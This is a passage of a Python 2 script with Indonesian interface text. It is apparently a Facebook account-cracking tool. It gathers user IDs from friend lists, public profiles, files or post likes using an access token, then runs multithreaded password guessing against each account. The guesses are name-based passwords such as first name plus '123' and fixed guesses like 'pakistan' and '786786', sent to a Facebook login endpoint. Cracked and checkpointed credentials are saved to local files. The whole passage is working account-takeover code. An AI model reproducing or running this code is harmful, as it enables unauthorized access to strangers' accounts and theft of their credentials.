					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/usa.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos2
							cek = open("done/usa.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name']+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/usa.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos3
									cek = open("done/usa.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['first_name']+'1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/usa.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos4
											cek = open("done/usa.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name']+'12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/usa.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos5
													cek = open("done/usa.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m══════════════════════════════════════════════════════════════════════"
	print '\033[1;94m[\033[1;91m+\033[1;97m] \033[1;97mSelesai ...'
	print"\033[1;94m[\033[1;91m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;94m[\033[1;91m+\033[1;97m] \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97mfile tersimpan \033[1;91m: \033[1;92mdone/usa.txt'
	print 50* "\033[1;91m═"
	raw_input("\033[1;97m{<\033[1;95mKembali\033[1;97m>}")
	animate()
	
##### CRACK PAKISTAN #####
def crack_pakis():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;92m═"
	print "\033[1;92m(\033[1;97m01\033[1;92m) Crack Dari Daftar Teman"
	print "\033[1;92m(\033[1;97m02\033[1;92m) Crack Dari Publik/Teman"
	print "\033[1;92m(\033[1;97m03\033[1;92m) Crack Dari File"
	print "\033[1;97m(\033[1;92m00\033[1;97m) Kembali"
	print 50* "\033[1;97m═"
	pilih_pakis()

#### PILIH PAKISTAN ####
def pilih_pakis():
	teak = raw_input("\033[1;92mPilih Nomer \033[97m?\033[1;92m ")
	if teak =="":
		print"\033[1;92m<\033[1;97m!\033[1;92m>\033[1;93m Isi Dengan Benar !"
		pilih_pakis()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;92m═"
		print ("             \033[1;92m°°° \033[1;97mCRACK PAKISTAN \033[1;92m°°°")
		print 50* "\033[1;97m═"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;92m═"
		print ("             \033[1;92m°°° \033[1;97mCRACK PAKISTAN \033[1;92m°°°")
		print 50* "\033[1;97m═"
		idt = raw_input("\033[1;92m[\033[1;97m+\033[1;92m] \033[1;97mID Publik/Teman \033[1;91m:\033[1;94m ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;92m[\033[1;97m+\033[1;92m] \033[1;97mNama \033[1;91m:\033[1;96m "+op["name"]
		except KeyError:
			print"\033[1;92m<\033[1;97m!\033[1;92m> ID publik/teman tidak ada !"
			raw_input("\n\033[1;92m{\033[1;97mKembali\033[1;92m}")
			crack_pakis()
		except requests.exceptions.ConnectionError:
			print"\033[1;92m{\033[1;97m!\033[1;92m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;92m═"
			print ("             \033[1;92m°°° \033[1;97mCRACK PAKISTAN \033[1;92m°°°")
			print 50* "\033[1;97m═"
			idlist = raw_input('\033[1;92m[\033[1;97m+\033[1;92m] \033[1;97mNama File\033[1;92m :\033[1;91m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;92m<\033[1;97m!\033[1;92m> File tidak ada ! '
			raw_input('\n\033[1;92m{ \033[1;97mKembali \033[1;92m}')
		except IOError:
			print '\033[1;92m<\033[1;97m!\033[1;92m> File tidak ada !'
			raw_input("\n\033[1;92m{\033[1;97mKembali\033[1;92m}")
			crack_pakis()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;92m<\033[1;97m!\033[1;92m>\033[1;97m Isi Dengan Benar !"
		pilih_pakis()
	
	print "\033[1;92m[\033[1;917m+\033[1;92m] \033[1;97mTotal ID \033[1;91m:\033[1;93m "+str(len(id))
	print('\033[1;92m[\033[1;97m+\033[1;92m] \033[1;97mStop Tekan \033[1;92mCTRL+Z')
	titik = ['\033[1;92m. ','\033[1;93m.. ','\033[1;96m... ','\033[1;95m.... ','\033[1;97m..... ']
	for o in titik:
		print("\r\033[1;92m[\033[1;97m+\033[1;92m] \033[1;97mCrack \033[1;95mBerjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;92m[\033[1;97m+\033[1;92m] \033[1;97mGunakan \033[1;90mMode \033[1;91mPesawat \033[1;97mJika Tidak Ada Hasil")
	print ("\033[1;92m══════════════════════════════════════════════════════════════════════")
	
##### MAIN PAKISTAN #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/pakis.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos1
					cek = open("done/pakis.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/pakis.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos2
							cek = open("done/pakis.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/pakis.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos3
									cek = open("done/pakis.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('pakistan')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/pakis.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos4
											cek = open("done/pakis.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('786786')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/pakis.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos5
													cek = open("done/pakis.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['last_name'].lower()+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/pakis.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos6
															cek = open("done/pakis.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['last_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
																oke = open("done/pakis.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos7
																	cek = open("done/pakis.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'1234'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
																		oke = open("done/pakis.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos8
																			cek = open("done/pakis.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;97m══════════════════════════════════════════════════════════════════════"
	print '\033[1;92m[\033[1;97m+\033[1;92m] \033[1;97mSelesai ...'
	print"\033[1;92m[\033[1;97m+\033[1;92m] \033[1;97mTotal \033[1;92mOK\033[1;93m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;92m[\033[1;97m+\033[1;92m] \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97mfile tersimpan \033[1;91m: \033[1;92mdone/pakis.txt'
	print 50* "\033[1;92m═"
	raw_input("\033[1;92m<\033[1;97mKembali\033[1;92m>")
	animate()
	
##### CRACK LIKES #####
def crack_likes():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
		print 50* "\033[1;93m═"
		print ("        \033[1;97m°°° \033[1;92mCRACK POSTINGAN GRUP/TEMAN\033[1;97m °°°")
		print 50* "\033[1;91m═"
		tez = raw_input("\033[1;97m(\033[1;96m~\033[1;97m)\033[1;96m ID Postingan Group/Teman \033[1;95m :\033[1;94m ")
		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=9999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		jalan('\r\033[1;95m(\033[1;92m~\033[1;95m) \033[1;97mMengambil \033[1;90mID ...')
	except KeyError:
		print"\033[1;97m<\033[1;91m!\033[1;97m> ID Postingan Salah"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
		
	print "\033[1;95m(\033[1;92m~\033[1;95m) \033[1;97mTotal ID \033[1;92m:\033[1;91m "+str(len(id))
	print('\033[1;95m(\033[1;92m~\033[1;95m} \033[1;97mStop \033[1;94mTekan CTRL+Z')
	titik = ['\033[1;92m. ','\033[1;93m.. ','\033[1;96m... ','\033[1;95m.... ','\033[1;97m..... ']
	for o in titik:
		print("\r\033[1;95m(\033[1;92m~\033[1;95m) \033[1;97mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
